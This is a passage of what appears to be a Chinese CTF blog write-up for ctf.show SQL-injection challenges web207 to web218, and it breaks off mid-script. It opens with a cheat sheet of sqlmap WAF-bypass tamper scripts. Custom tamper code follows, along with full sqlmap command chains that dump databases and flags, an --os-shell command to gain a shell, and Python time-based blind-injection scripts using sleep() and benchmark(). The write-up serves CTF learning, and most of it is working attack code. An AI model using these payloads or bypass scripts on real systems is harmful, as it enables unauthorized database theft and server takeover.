速查</h2><table><thead><tr><th>脚本名称</th><th>作用</th></tr></thead><tbody><tr><td>apostrophemask.py</td><td>用utf8代替引号</td></tr><tr><td>equaltolike.py</td><td>like 代替等号</td></tr><tr><td>space2dash.py</td><td>绕过过滤’&#x3D;’ 替换空格字符(“)，(‘’ - ‘)后跟一个破折号注释，一个随机字符串和一个新行(‘n’)</td></tr><tr><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td></tr><tr><td>space2hash.py</td><td>空格替换为#号 随机字符串 以及换行符</td></tr><tr><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td></tr><tr><td>halfversionedmorekeywords.py</td><td>当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</td></tr><tr><td>space2morehash.py</td><td>空格替换为 #号 以及更多随机字符串 换行符</td></tr><tr><td>appendnullbyte.py</td><td>在有效负荷结束位置加载零字节字符编码</td></tr><tr><td>ifnull2ifisnull.py</td><td>绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td></tr><tr><td>space2mssqlblank.py</td><td>空格替换为其它空符号</td></tr><tr><td>base64encode.py</td><td>用base64编码替换</td></tr><tr><td>space2mssqlhash.py</td><td>替换空格</td></tr><tr><td>modsecurityversioned.py</td><td>过滤空格，包含完整的查询版本注释</td></tr><tr><td>space2mysqlblank.py</td><td>空格替换其它空白符号(mysql)</td></tr><tr><td>between.py</td><td>用between替换大于号(&gt;)</td></tr><tr><td>space2mysqldash.py</td><td>替换空格字符(“)(‘ - ‘)后跟一个破折号注释一个新行(‘ n’)</td></tr><tr><td>multiplespaces.py</td><td>围绕SQL关键字添加多个空格</td></tr><tr><td>space2plus.py</td><td>用+替换空格</td></tr><tr><td>bluecoat.py</td><td>代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换&#x3D;为like</td></tr><tr><td>nonrecursivereplacement.py</td><td>取代predefined SQL关键字with表示 suitable for替代(例如 .replace(“SELECT”、””)) filters</td></tr><tr><td>space2randomblank.py</td><td>代替空格字符(“”)从一个随机的空白字符可选字符的有效集</td></tr><tr><td>sp_password.py</td><td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td></tr><tr><td>chardoubleencode.py</td><td>双url编码(不处理以编码的)</td></tr><tr><td>unionalltounion.py</td><td>替换UNION ALL SELECT UNION SELECT</td></tr><tr><td>charencode.py</td><td>url编码</td></tr><tr><td>randomcase.py</td><td>随机大小写</td></tr><tr><td>unmagicquotes.py</td><td>宽字符绕过 GPC addslashes</td></tr><tr><td>randomcomments.py</td><td>用 <code>/**/</code> 分割sql关键字</td></tr><tr><td>charunicodeencode.py</td><td>字符串unicode编码</td></tr><tr><td>securesphere.py</td><td>追加特制的字符串</td></tr><tr><td>versionedmorekeywords.py</td><td>注释绕过</td></tr><tr><td>space2comment.py</td><td>Replaces space character <code>&#39; &#39;</code> with comments <code>/**/</code></td></tr></tbody></table><p>我们来试一下哦 web207.py 大概意思就是把空格用 0x0a代替也就是回车</p><pre><code class="python">#!/usr/bin/env pythonfrom lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef tamper(payload,**kwargs):    payload = space2comment(payload)    return payloaddef space2comment(payload):    retVal = payload    if payload:        retVal = &quot;&quot;        quote, doublequote , firstspace = False, False ,False        for i in xrange(len(payload)):            if not firstspace:                if payload[i].isspace():                    firstspace = True                    retVal += chr(0x0a)                    continue            elif payload[i] == &#39;\&#39;&#39;:                quote = not quote            elif payload[i] == &#39;&quot;&#39;:                doublequote = not doublequote            elif payload[i] == &quot; &quot; and not doublequote and not quote:                retVal += chr(0x0a)                continue            retVal += payload[i]    return  retVal</code></pre><p>我们挂一下代理看看是怎么改的</p><pre><code>python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch --proxy=&quot;http://127.0.0.1:8080&quot;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407210406203.png" alt="image-20220407210406203"></p><pre><code>注入点python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch数据库python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch --dbs表名python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch -D ctfshow_web --tables字段名python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch -D ctfshow_web -T ctfshow_flaxca --columns数据python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump</code></pre><h1 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h1><h2 id="小括号闭合-大小写"><a href="#小括号闭合-大小写" class="headerlink" title="小括号闭合,大小写"></a>小括号闭合,大小写</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407210921431.png" alt="image-20220407210921431"></p><p>这时你就需要–prefix和–suffix参数了：</p><pre><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;</code></pre><pre><code>注入点python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#39;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch数据库python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#39;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch --dbs 表名python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#39;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch -D ctfshow_web --tables字段名python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#39;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch -D ctfshow_web -T ctfshow_flaxcac --columns数据python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#39;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump</code></pre><h1 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407215132018.png" alt="image-20220407215132018"></p><h2 id="过滤-等号和空格"><a href="#过滤-等号和空格" class="headerlink" title="过滤* 等号和空格"></a>过滤* 等号和空格</h2><p>web209.py</p><pre><code class="python">#!/usr/bin/env pythonfrom lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef tamper(payload , **kwargs):    payload = space2comment(payload)    return payloaddef space2comment(payload):    retVal = payload    if payload:        retVal = &quot;&quot;        quote , doublequote , firstspace = False ,False ,False        for i in xrange(len(payload)):            if not firstspace:                if payload[i].isspace():                    firstspace = True                    retVal += (chr(0x0a)) #return                    continue            elif payload[i] ==&quot;\&#39;&quot;:                quote = not quote            elif payload[i] == &#39;&quot;&#39;:                doublequote = not doublequote            elif payload[i] == &quot;*&quot;:                retVal += chr(0x31)#1                continue            elif payload[i] == &quot;=&quot;:                retVal += chr(0x0a) + &#39;like&#39; + chr(0x0a)                continue            elif payload[i] == &quot; &quot; and not doublequote and not quote:                retVal += chr(0x0a)                continue            retVal += payload[i]    return retVal</code></pre><pre><code>注入点python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209数据库python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 --dbs 表名python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 -D ctfshow_web --tables字段名python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 -D  ctfshow_web -T  ctfshow_flav --columns数据python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 -D  ctfshow_web -T  ctfshow_flav -C ctfshow_flagx --dump</code></pre><h1 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h1><h2 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407214810805.png" alt="image-20220407214810805"></p><p>web210.py</p><pre><code class="python">#!/usr/bin/env pythonfrom lib.core.compat import xrangefrom lib.core.enums import PRIORITYimport base64__priority__ = PRIORITY.LOWdef tamper(payload, **kwargs):    payload = space2comment(payload)    retVal = &quot;&quot;    if payload:        retVal = base64.b64encode(payload[::-1].encode(&#39;utf-8&#39;)) #翻转字符串以utf-8便码成二进制        retVal = base64.b64encode(retVal[::-1]).decode(&#39;utf-8&#39;)#解码成utf-8    return retValdef space2comment(payload):    retVal = payload    if payload:        retVal = &quot;&quot;        quote, doublequote , firstspqce = False ,False ,False        for i in xrange(len(payload)):            if not firstspqce:                if payload[i].isspace():                    firstspqce = True                    retVal += chr(0x0a)                    continue            elif payload[i] == &quot;\&#39;&quot;:                quote = not quote            elif payload[i] == &#39;&quot;&#39;:                doublequote = not doublequote            elif payload[i] == &quot;*&quot;:                retVal += chr(0x31)                continue            elif payload[i] == &quot;=&quot;:                retVal += chr(0x0a) + &#39;like&#39; + chr(0x0a)                continue            elif payload[i] == &quot; &quot;and not doublequote and not quote:                retVal += chr(0x0a)                continue            retVal += payload[i]        return retVal</code></pre><pre><code>注入点python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210数据库python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --dbs表名python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --tables -D  ctfshow_web字段名python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavi --columns 数据python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavi -C ctfshow_flagxx --dump </code></pre><h1 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h1><h2 id="base64解密翻转字符过滤空格"><a href="#base64解密翻转字符过滤空格" class="headerlink" title="base64解密翻转字符过滤空格"></a>base64解密翻转字符过滤空格</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407221144978.png" alt="image-20220407221144978"></p><p>210脚本</p><pre><code>注入点python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210数据库python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --dbs表名python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --tables -D  ctfshow_web字段名python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavia --columns 数据python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavia -C ctfshow_flagxxa --dump </code></pre><h1 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h1><h2 id="base64解密翻转字符过滤空格-1"><a href="#base64解密翻转字符过滤空格-1" class="headerlink" title="base64解密翻转字符过滤空格 *"></a>base64解密翻转字符过滤空格 *</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407221504134.png" alt="image-20220407221504134"></p><p><a href="http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/">http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/</a></p><pre><code>注入点python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210数据库python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --dbs表名python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --tables -D  ctfshow_web字段名python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavis --columns 数据python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavis -C ctfshow_flagxsa --dump </code></pre><h1 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h1><h2 id="使用–os-shell-一键getshell"><a href="#使用–os-shell-一键getshell" class="headerlink" title="使用–os-shell 一键getshell"></a>使用–os-shell 一键getshell</h2><pre><code>python sqlmap.py -u http://45646f72-e298-4956-87c9-62cea287a473.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://45646f72-e298-4956-87c9-62cea287a473.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web210 --dump  --os-shell --batch</code></pre><p>这里还没写完,但是已经写的差不多了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407222705713.png" alt="image-20220407222705713"></p><p>发现是一个上传文件页面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407222740808.png" alt="image-20220407222740808"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407223832502.png" alt="image-20220407223832502"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407223908157.png" alt="image-20220407223908157"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407223941771.png" alt="image-20220407223941771"></p><h1 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h1><p>没找到参数在哪,翻翻源码看看</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408110118163.png" alt="image-20220408110118163"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408110151699.png" alt="image-20220408110151699"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408110311009.png" alt="image-20220408110311009"></p><p>我们看看这个select.js的写法,发现向api&#x2F;post了ip和debug两个参数</p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>判断</p><pre><code class="python">import requestsurl = &quot;http://74b615cd-aac0-4c4a-889f-84aa544d2a96.challenge.ctf.show/api/&quot;payload = &quot;length(database())=0&quot; #没延迟#payload = &quot;length(database())&gt;0&quot; #延迟date = &#123;    &#39;ip&#39;: f&quot;if((&#123;payload&#125;),sleep(2),1)&quot;,    &#39;debug&#39;: &quot;0&quot;&#125;try:    r = requests.post(url, data=date, timeout=1)    print(&#39;没延迟&#39;)except Exception as e:    print(&#39;延迟&#39;)</code></pre><pre><code class="python">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;import requestsurl = &quot;http://d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show/api/&quot;result = &quot;&quot;i = 0while True:    i = i + 1    head = 32    tail = 127    while head &lt; tail:        mid = (head + tail) &gt;&gt; 1        # 查数据库        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;        # 查列名字-id.flag        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagx&#39;&quot;        # 查数据        payload = &quot;select flaga from ctfshow_flagx&quot;        data = &#123;            &#39;ip&#39;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;,            &#39;debug&#39;:&#39;0&#39;        &#125;        try:            r = requests.post(url, data=data, timeout=1)            tail = mid        except Exception as e:            head = mid + 1    if head != 32:        result += chr(head)    else:        break    print(result)</code></pre><h1 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h1><h2 id="过滤单引号时间盲注"><a href="#过滤单引号时间盲注" class="headerlink" title="过滤单引号时间盲注"></a>过滤单引号时间盲注</h2><pre><code class="python">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;import requestsurl = &quot;http://4ba8a766-0fda-4c66-bdbc-0e3f0a9d57dc.chall.ctf.show/api/&quot;result = &quot;&quot;i = 0while True:    i = i + 1    head = 32    tail = 127    while head &lt; tail:        mid = (head + tail) &gt;&gt; 1        # 查数据库        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;        # 查列名字-id.flag        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxc&#39;&quot;        # 查数据        payload = &quot;select flagaa from ctfshow_flagxc&quot;        data = &#123;            &#39;ip&#39;: f&quot;1&#39; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1) and &#39;1&#39;=&#39;1&quot;,            &#39;debug&#39;:&#39;0&#39;        &#125;        try:            r = requests.post(url, data=data, timeout=1)            tail = mid        except Exception as e:            head = mid + 1    if head != 32:        result += chr(head)    else:        break    print(result)</code></pre><h1 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h1><h2 id="base64解码id"><a href="#base64解码id" class="headerlink" title="base64解码id"></a>base64解码id</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408124221533.png" alt="image-20220408124221533"></p><pre><code class="python">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;import requestsurl = &quot;http://0f3060ee-be00-4090-a8e7-fc0944779c24.chall.ctf.show/api/&quot;result = &quot;&quot;i = 0while True:    i = i + 1    head = 32    tail = 127    while head &lt; tail:        mid = (head + tail) &gt;&gt; 1        # 查数据库        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;        # 查列名字-id.flag        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxcc&#39;&quot;        # 查数据        payload = &quot;select flagaac from ctfshow_flagxcc&quot;        data = &#123;            &#39;ip&#39;: f&quot;&#39;MQ==&#39;) or if (ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1&quot;,            &#39;debug&#39;:&#39;0&#39;        &#125;        try:            r = requests.post(url, data=data, timeout=1)            tail = mid        except Exception as e:            head = mid + 1    if head != 32:        result += chr(head)    else:        break    print(result)</code></pre><h1 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h1><h2 id="benchmark-时间盲注"><a href="#benchmark-时间盲注" class="headerlink" title="benchmark()时间盲注"></a>benchmark()时间盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408132254910.png" alt="image-20220408132254910"></p><pre><code> benchmark(t,exp)     select benchmark(count,expr),是重复执行count次expr表达式，使得处理时间很长，来产生延迟，     比如select benchmark(1000000,encode(&quot;hello&quot;,&quot;good&quot;));     select benchmark( 5000000, md5( &#39;test&#39; ));</code></pre><p>判断</p><pre><code class="python">import requestsurl = &quot;http://9b2612c9-bd0f-4733-9729-1efec72f21f9.challenge.ctf.show/api/&quot;#payload = &quot;length(database())=0&quot; #没延迟payload = &quot;length(database())&gt;0&quot; #延迟date = &#123;    &#39;ip&#39;: f&quot;1) or if((&#123;payload&#125;),benchmark(3480500,sha(1)),1)#&quot;,    &#39;debug&#39;: &quot;0&quot;&#125;try:    r = requests.post(url, data=date, timeout=1)    print(&#39;没延迟&#39;)except Exception as e:    print(&#39;延迟&#39;)</code></pre><pre><code class="python">import requestsimport timeurl = &quot;http://bc98f2a3-911d-4606-9d0e-e277bf086bdf.challenge.ctf.show/api/&quot;ans = &quot;&quot;i = 0while True:    i += 1    head = 32    tail = 127    j = 0    while head &lt; tail:        j += 1        if j / 2 == 1: #算两个让数据库歇一会,不然数据库还没算完,就算下一个会有误差            time.sleep(2)        mid = (head + tail) &gt;&gt; 1        #表名 ctfshow_flagxccb        #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;        #字段名 flagaabc        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxccb&#39;&quot;        # 数据 防止查错咱们多等会呗,可用改改benchmark的循环次数,我改到7400000        payload = &quot;select flagaabc from ctfshow_flagxccb&quot;        data = &#123;            &#39;ip&#39; :f&quot;1) or if((ascii(substr((&#123;payload&#125;),&#123;i&#125;,1)))&gt;&#123;mid&#125;,benchmark(3480500,sha(1)),1&quot;,            &#39;debug&#39; : &#39;0&#39;        &#125;        try:            r = requests.post(url , data= data ,timeout=1)            #time.sleep(0.3)            tail = mid        except Exception as e:            head = mid +1    if head != 32:        ans += chr(head)    else:        break    print(ans)</code></pre><p><a href="https://www.cnblogs.com/forforever/p/13019703.html">MySQL时间盲注五种延时方法</a></p><h1 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h1><h2 id="多表联合查询时间盲注"><a href="#多表联合查询时间盲注" class="headerlink" title="多表联合查询时间盲注"></a>多表联合查询时间盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408142736722.png" alt="image-20220408142736722"></p><pre><code class="python">import requestsimport timeurl = 